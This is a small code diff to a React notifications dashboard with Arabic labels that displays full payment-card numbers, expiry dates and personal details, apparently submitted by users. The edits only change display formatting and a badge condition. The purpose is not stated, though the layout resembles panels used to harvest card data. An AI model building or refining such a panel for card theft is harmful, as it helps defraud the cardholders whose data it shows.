@@ -212,7 +212,7 @@ export default function NotificationsPage() {
                     <div className="flex flex-col sm:flex-row gap-2">
                       <Badge
                         variant={
-notification.personalInfo.fullName
+notification.personalInfo.id
                             ? 'default'
                             : 'destructive'
                         }
@@ -221,7 +221,7 @@ notification.personalInfo.fullName
                           handleInfoClick(notification, 'personal')
                         }
                       >
-                        {notification.personalInfo.fullName
+                        {notification.personalInfo.id
                           ? 'معلومات شخصية'
                           : 'لا يوجد معلومات'}
                       </Badge>
@@ -306,11 +306,11 @@ notification.personalInfo.fullName
               <p></p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.cardNumber} {selectedNotification.prefix}
+                {selectedNotification.cardNumber} -{selectedNotification.prefix}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.year}{selectedNotification.month}
+                {selectedNotification.year}/{selectedNotification.month}
               </p>
 
               <p className="flex items-center">
